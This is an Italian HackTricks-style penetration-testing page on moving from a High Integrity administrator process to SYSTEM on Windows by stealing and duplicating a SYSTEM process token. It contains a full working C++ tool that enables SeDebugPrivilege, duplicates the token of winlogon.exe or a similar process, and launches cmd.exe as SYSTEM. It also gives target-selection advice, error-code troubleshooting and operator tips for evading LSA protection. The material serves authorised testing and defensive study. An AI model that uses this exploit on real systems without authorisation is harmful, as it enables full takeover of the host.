# SeImpersonate da High a System

{{#include ../../banners/hacktricks-training.md}}

Questa pagina riguarda la versione **manuale** del passaggio da un processo amministratore con **High Integrity** a **`NT AUTHORITY\SYSTEM`** aprendo un processo SYSTEM non protetto, duplicandone il token e avviando un processo figlio con quel token.

Se hai solo **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`** ma **non puoi aprire un processo SYSTEM adatto**, il percorso **Potato / named-pipe** è di solito più affidabile:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

Se quello che vuoi non è solo `SYSTEM` ma un **SYSTEM token con il maggior numero possibile di privilegi**, controlla anche:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Quick triage

Prima di provare a rubare un token, valida rapidamente il contesto:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Practical notes:

- Un token admin **High Integrity** di solito è sufficiente per **abilitare `SeDebugPrivilege`** e aprire molti processi SYSTEM non protetti.
- **`CreateProcessWithTokenW` richiede `SeImpersonatePrivilege`** sul chiamante. Se quella API fallisce con `1314`, passa a `CreateProcessAsUserW` dopo aver già duplicato un token primario SYSTEM.
- Su Windows moderni, **`lsass.exe` è spesso un cattivo target** perché **LSA protection / PPL** blocca l’accesso anche agli amministratori con `SeDebugPrivilege`. Preferisci **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`**, oppure un **`svchost.exe`** iniziale in esecuzione come SYSTEM.
- Non tutti i processi SYSTEM hanno un token ugualmente utile. Se ottieni SYSTEM ma noti privilegi mancanti, prova un altro processo SYSTEM invece di assumere che la tecnica sia rotta.

## Pick the PID carefully

Il modo più semplice per farlo funzionare in modo affidabile è **scegliere un processo SYSTEM la cui DACL consenta davvero agli Administrators di interrogare il processo e duplicarne il token**.

Buoni candidati da provare per primi:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- alcune istanze iniziali di `svchost.exe` in esecuzione come SYSTEM

Da evitare di default:

- `lsass.exe` su host dove **RunAsPPL / LSA protection** è abilitato
- processi protetti / sensibili alla sicurezza che restituiscono `Access denied` anche dopo aver abilitato `SeDebugPrivilege`

Puoi ispezionare i processi candidati e i loro token/ACL con **Process Explorer** o **Process Hacker** eseguiti con privilegi elevati.

### Code

Il seguente codice è preso [here](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Permette di **indicare un Process ID come argomento** e verrà eseguito un CMD **in esecuzione come l'utente** del processo indicato.\
Eseguendolo in un processo con High Integrity puoi **indicare il PID di un processo in esecuzione come System** (come `winlogon`, `wininit`) ed eseguire un `cmd.exe` come SYSTEM.
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Note utili su API / diritti di accesso

L'esempio usa `MAXIMUM_ALLOWED`, ma per operazioni reali è utile ricordare i requisiti minimi coinvolti:

- `OpenProcessToken()` richiede solo che l'**handle del processo** sia stato aperto con **`PROCESS_QUERY_LIMITED_INFORMATION`**.
- Per usare `CreateProcessWithTokenW()`, l'**handle del primary token** deve avere **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- `DuplicateTokenEx()` deve creare un **primary token** (`TokenPrimary`), non solo un impersonation token.
- Se hai già impersonato SYSTEM e `CreateProcessWithTokenW()` fallisce ancora con `1314`, prova invece `CreateProcessAsUserW()`.

Questo significa che **aprire il processo target con `PROCESS_ALL_ACCESS` è di solito inutile e più rumoroso** rispetto a richiedere solo i diritti necessari per interrogare il token.

## Errore

In alcune occasioni potresti provare a impersonare System e non funzionerà, mostrando un output come il seguente:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
Questo significa che anche se stai eseguendo a un livello di High Integrity **non hai permessi sufficienti** su quel processo/token di destinazione.\
Vediamo i permessi attuali di Administrator su processi `svchost.exe` con **Process Explorer** (oppure puoi usare anche **Process Hacker**):

1. Seleziona un processo di `svchost.exe`
2. Click destro --> Properties
3. Nella scheda "Security" click in basso a destra sul bottone "Permissions"
4. Click su "Advanced"
5. Seleziona "Administrators" e click su "Edit"
6. Click su "Show advanced permissions"

![Code - Error: 6. Click on "Show advanced permissions"](<../../images/image (437).png>)

L'immagine precedente contiene tutti i privilegi che "Administrators" hanno sul processo selezionato (come puoi vedere nel caso di `svchost.exe` hanno solo privilegi di "Query")

Guarda i privilegi che "Administrators" hanno su `winlogon.exe`:

![Code - Error: See the privileges "Administrators" have over winlogon.exe](<../../images/image (1102).png>)

Dentro quel processo "Administrators" possono "Read Memory" e "Read Permissions", il che probabilmente permette a Administrators di impersonate il token usato da questo processo.

### Common failure causes

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: la DACL del processo ti blocca, oppure il target è **protected/PPL**. Scegli un altro processo SYSTEM.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: l'handle del token è stato aperto senza diritti sufficienti, oppure la DACL del token target impedisce la duplicazione.
- **`CreateProcessWithTokenW()` -> `1314`**: il chiamante non ha attualmente **`SeImpersonatePrivilege`** abilitato. Prova prima ad abilitarlo oppure usa `CreateProcessAsUserW()` con il primary token duplicato.
- **`CreateProcessWithTokenW()` -> `1326`** dopo i fallimenti precedenti: spesso significa semplicemente che il precedente step di duplicazione/impersonation del token è fallito, quindi non c'è nessun primary token utilizzabile per avviare il processo figlio.

## Operator notes

- Questa tecnica è ottima quando sei già **local admin + high integrity** e vuoi solo un percorso rapido e manuale verso SYSTEM senza avviare un service o una catena di coercion via named pipe.
- Su ambienti Windows 11 / Server hardenizzati, **LSA protection è sempre più comune**, quindi un flusso di lavoro che assume che `lsass.exe` sia sempre leggibile è fragile. **`winlogon.exe` / `wininit.exe` / `services.exe` sono di solito i primi scelte migliori**.
- Se finisci in un contesto di **service account** invece che in una desktop elevata da admin, la **famiglia Potato** è di solito più adatta di questa pagina.



## References

- [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [SensePost: Abusing Windows' tokens to compromise Active Directory without touching LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
{{#include ../../banners/hacktricks-training.md}}
